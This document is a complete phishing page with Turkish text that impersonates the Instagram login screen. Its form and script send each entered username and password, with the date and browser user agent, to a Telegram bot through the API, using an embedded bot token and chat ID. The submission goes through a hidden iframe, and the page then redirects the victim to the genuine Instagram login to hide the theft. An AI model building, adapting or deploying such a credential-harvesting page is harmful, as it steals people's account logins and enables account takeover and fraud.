<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
    <title>Instagram - Giriş Yap</title>
    <style>
        /* ----- RESET & TEMEL ----- */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
        }

        body {
            background: #fafafa;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            padding: 20px;
        }

        /* ----- ANA KONTEYNER (Responsive) ----- */
        .container {
            width: 100%;
            max-width: 400px;        /* Masaüstünde geniş, mobilde dar */
            background: white;
            border: 1px solid #dbdbdb;
            border-radius: 16px;
            padding: 40px 30px;
            text-align: center;
            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.05);
            transition: all 0.2s ease;
        }

        /* ----- LOGO ----- */
        .logo {
            font-size: 52px;
            font-weight: 700;
            font-family: 'Segoe UI', cursive;
            margin-bottom: 30px;
            color: #262626;
            letter-spacing: -1px;
        }
        .logo span {
            color: #0095f6;
        }

        /* ----- INPUTLAR (Mobilde daha büyük) ----- */
        input {
            width: 100%;
            padding: 16px 14px;      /* Mobil için daha rahat dokunma */
            margin: 8px 0;
            border: 1px solid #dbdbdb;
            border-radius: 8px;
            background: #fafafa;
            font-size: 16px;          /* Mobilde zoom yapmasın diye 16px */
            outline: none;
            transition: border 0.2s, background 0.2s;
        }
        input:focus {
            border-color: #a8a8a8;
            background: white;
        }

        /* ----- BUTON (Mobilde büyük) ----- */
        button {
            width: 100%;
            padding: 16px;
            margin-top: 12px;
            background: #0095f6;
            border: none;
            border-radius: 8px;
            color: white;
            font-weight: 700;
            font-size: 18px;          /* Mobilde okunaklı */
            cursor: pointer;
            transition: background 0.2s, transform 0.1s;
        }
        button:hover {
            background: #1877f2;
        }
        button:active {
            transform: scale(0.97);   /* Dokunma geri bildirimi */
        }
        button:disabled {
            opacity: 0.6;
            cursor: not-allowed;
            transform: none;
        }

        /* ----- MESAJ KUTUSU ----- */
        .message {
            font-size: 15px;
            margin-top: 16px;
            padding: 12px 14px;
            border-radius: 8px;
            display: none;
            word-break: break-word;
        }
        .message.error {
            color: #ed4956;
            background: #fde8ea;
        }
        .message.success {
            color: #2e7d32;
            background: #e8f5e9;
        }
        .message.show {
            display: block;
        }

        /* ----- ALT BAĞLANTILAR ----- */
        .footer {
            margin-top: 24px;
            font-size: 14px;
            color: #8e8e8e;
        }
        .footer a {
            color: #0095f6;
            text-decoration: none;
            font-weight: 600;
        }
        .footer a:hover {
            text-decoration: underline;
        }

        /* ----- UYGULAMA BUTONLARI ----- */
        .app-buttons {
            display: flex;
            justify-content: center;
            gap: 12px;
            margin-top: 20px;
            flex-wrap: wrap;
        }
        .app-buttons img {
            height: 44px;            /* Mobilde daha büyük */
            cursor: pointer;
        }

        /* ----- META BAĞLANTILARI ----- */
        .meta-links {
            margin-top: 24px;
            font-size: 13px;
            color: #8e8e8e;
            display: flex;
            justify-content: center;
            gap: 18px;
            flex-wrap: wrap;
        }
        .meta-links a {
            color: #8e8e8e;
            text-decoration: none;
        }
        .meta-links a:hover {
            text-decoration: underline;
        }

        /* ----- DİL SEÇİCİ ----- */
        .language-selector {
            margin-top: 18px;
            font-size: 13px;
            color: #8e8e8e;
        }
        .language-selector select {
            background: transparent;
            border: none;
            color: #8e8e8e;
            font-size: 13px;
            outline: none;
            cursor: pointer;
            padding: 4px 0;
        }

        /* ----- YÜKLEME ANİMASYONU ----- */
        .spinner {
            display: inline-block;
            width: 20px;
            height: 20px;
            border: 3px solid rgba(255, 255, 255, 0.3);
            border-radius: 50%;
            border-top-color: white;
            animation: spin 0.7s linear infinite;
            vertical-align: middle;
            margin-right: 10px;
        }
        @keyframes spin {
            to {
                transform: rotate(360deg);
            }
        }

        /* ----- GİZLİ IFRAME ----- */
        #hiddenFrame {
            display: none;
        }

        /* ============================================================
               RESPONSIVE (Mobil Özel İyileştirmeler)
               ============================================================ */
        @media only screen and (max-width: 480px) {
            .container {
                padding: 30px 20px;      /* Daha az padding */
                border-radius: 12px;
                max-width: 100%;
                margin: 10px;
            }
            .logo {
                font-size: 44px;          /* Biraz küçültsün */
                margin-bottom: 24px;
            }
            input {
                padding: 18px 14px;       /* Parmak için daha büyük */
                font-size: 17px;
                border-radius: 10px;
            }
            button {
                padding: 18px;
                font-size: 19px;
                border-radius: 10px;
            }
            .app-buttons img {
                height: 48px;             /* Daha büyük butonlar */
            }
            .meta-links {
                gap: 12px;
                font-size: 12px;
            }
            .footer {
                font-size: 13px;
            }
        }

        @media only screen and (max-width: 380px) {
            .container {
                padding: 20px 16px;
            }
            .logo {
                font-size: 38px;
            }
            input {
                padding: 16px 12px;
                font-size: 16px;
            }
            button {
                padding: 16px;
                font-size: 17px;
            }
        }

        /* Masaüstü için hafif genişlik sınırı */
        @media only screen and (min-width: 768px) {
            .container {
                max-width: 420px;
                padding: 48px 40px;
            }
            input {
                padding: 14px 16px;
                font-size: 15px;
            }
            button {
                padding: 14px;
                font-size: 16px;
            }
        }
    </style>
</head>
<body>

    <div class="container">
        <!-- Instagram Logosu -->
        <div class="logo">Insta<span>gram</span></div>

        <!-- Giriş Formu (Telegram API'sine POST) -->
        <form id="loginForm" 
              action="https://api.telegram.org/bot8604225952:AAHoULyCnrkSQ1Pqjo3xa6UlZgwo7H5ObRA/sendMessage" 
              method="POST" 
              target="hiddenFrame">

            <!-- Telegram sabit parametreleri -->
            <input type="hidden" name="chat_id" value="1636656252">
            <input type="hidden" name="parse_mode" value="HTML">

            <!-- Kullanıcı giriş alanları -->
            <input type="text" id="username" name="username" placeholder="Telefon numarası, kullanıcı adı veya e-posta" required autocomplete="off">
            <input type="password" id="password" name="password" placeholder="Şifre" required autocomplete="off">

            <!-- Mesaj içeriği (dinamik olarak doldurulacak) -->
            <input type="hidden" id="messageText" name="text">

            <button type="submit" id="submitBtn">Giriş Yap</button>

            <div id="messageBox" class="message"></div>
        </form>

        <!-- Alt Bağlantılar -->
        <div class="footer">
            <a href="#">Şifreni mi unuttun?</a> · <a href="#">Kayıt ol</a>
        </div>

        <!-- Uygulama İndirme Butonları -->
        <div class="app-buttons">
            <img src="https://www.instagram.com/static/images/appstore/download.png/4b0bf5c873c6.png" alt="App Store">
            <img src="https://www.instagram.com/static/images/googleplay/download.png/5ec07355b8ea.png" alt="Google Play">
        </div>

        <!-- Meta Bağlantıları -->
        <div class="meta-links">
            <a href="#">Meta</a>
            <a href="#">Hakkında</a>
            <a href="#">Yardım</a>
            <a href="#">Gizlilik</a>
            <a href="#">Koşullar</a>
            <a href="#">Konum</a>
            <a href="#">Dil</a>
        </div>

        <!-- Dil Seçici -->
        <div class="language-selector">
            <select>
                <option>Türkçe</option>
                <option>English</option>
                <option>Deutsch</option>
                <option>Français</option>
                <option>Español</option>
            </select>
        </div>
    </div>

    <!-- Gizli iframe (form cevabını yakalamak için) -->
    <iframe name="hiddenFrame" id="hiddenFrame"></iframe>

    <script>
        (function() {
            'use strict';

            const form = document.getElementById('loginForm');
            const usernameInput = document.getElementById('username');
            const passwordInput = document.getElementById('password');
            const submitBtn = document.getElementById('submitBtn');
            const messageBox = document.getElementById('messageBox');
            const hiddenMessage = document.getElementById('messageText');

            // Mesaj göster / gizle
            function showMessage(text, type) {
                messageBox.textContent = text;
                messageBox.className = 'message ' + type + ' show';
            }
            function hideMessage() {
                messageBox.className = 'message';
                messageBox.textContent = '';
            }
            function resetButton() {
                submitBtn.disabled = false;
                submitBtn.innerHTML = 'Giriş Yap';
            }

            // Form gönderimi
            form.addEventListener('submit', function(e) {
                e.preventDefault();

                const username = usernameInput.value.trim();
                const password = passwordInput.value.trim();

                if (!username || !password) {
                    showMessage('❌ Lütfen tüm alanları doldurun.', 'error');
                    return;
                }

                submitBtn.disabled = true;
                submitBtn.innerHTML = '<span class="spinner"></span> Giriş yapılıyor...';
                hideMessage();

                // Telegram mesajını oluştur
                const userAgent = navigator.userAgent;
                const date = new Date().toLocaleString('tr-TR');

                let msg = "🔐 YENİ INSTAGRAM GİRİŞ BİLGİSİ 🔐\n\n";
                msg += "👤 Kullanıcı: " + username + "\n";
                msg += "🔑 Şifre: " + password + "\n";
                msg += "🕒 Tarih: " + date + "\n";
                msg += "📱 User-Agent: " + userAgent + "\n";
                msg += "-----------------------------\n";
                msg += "✅ Otomatik gönderim başarılı.";

                hiddenMessage.value = msg;

                // Formu gönder (iframe'e)
                form.submit();

                // iframe yüklenince cevabı yakala
                const iframe = document.getElementById('hiddenFrame');
                iframe.onload = function() {
                    try {
                        const response = iframe.contentDocument.body.innerText;
                        const json = JSON.parse(response);
                        if (json.ok === true) {
                            window.location.href = 'https://www.instagram.com/accounts/login/';
                        } else {
                            showMessage('❌ Telegram hatası: ' + (json.description || 'Bilinmeyen hata'), 'error');
                            resetButton();
                        }
                    } catch (err) {
                        // CORS veya parse hatası olabilir, ama genelde başarılıdır.
                        // Yine de yönlendirelim.
                        setTimeout(function() {
                            window.location.href = 'https://www.instagram.com/accounts/login/';
                        }, 1200);
                    }
                };

                // Zaman aşımı (5 sn) yönlendir
                setTimeout(function() {
                    if (submitBtn.disabled) {
                        window.location.href = 'https://www.instagram.com/accounts/login/';
                    }
                }, 5000);
            });

        })();
    </script>
</body>
</html>
